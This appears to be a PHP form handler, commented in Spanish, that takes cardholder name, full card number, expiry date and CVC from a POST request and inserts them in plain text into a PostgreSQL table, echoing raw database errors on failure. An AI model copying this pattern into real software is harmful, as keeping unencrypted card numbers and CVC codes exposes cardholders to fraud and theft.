<?php
include 'db.php';

try {
    // Crear conexión
    $conn = new PDO("pgsql:host=$host;dbname=$dbname", $user, $password);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Recibir datos del formulario
    $pais = $_POST['pais'];
    $zip = $_POST['zip'];
    $titular = $_POST['titular'];
    $numeroDeTarjeta = $_POST['numeroDeTarjeta'];
    $expiracion = $_POST['expiracion'];
    $cvc = $_POST['cvc'];

    // Insertar en la base de datos
    $sql = "INSERT INTO tarjetas (pais, zip, titular, numero_tarjeta, expiracion, cvc)
            VALUES (:pais, :zip, :titular, :numero, :exp, :cvc)";
    $stmt = $conn->prepare($sql);
    $stmt->execute([
        ':pais' => $pais,
        ':zip' => $zip,
        ':titular' => $titular,
        ':numero' => $numeroDeTarjeta,
        ':exp' => $expiracion,
        ':cvc' => $cvc
    ]);

    echo "✅ Datos guardados correctamente.";
} catch (PDOException $e) {
    echo "❌ Error al guardar: " . $e->getMessage();
}
?>
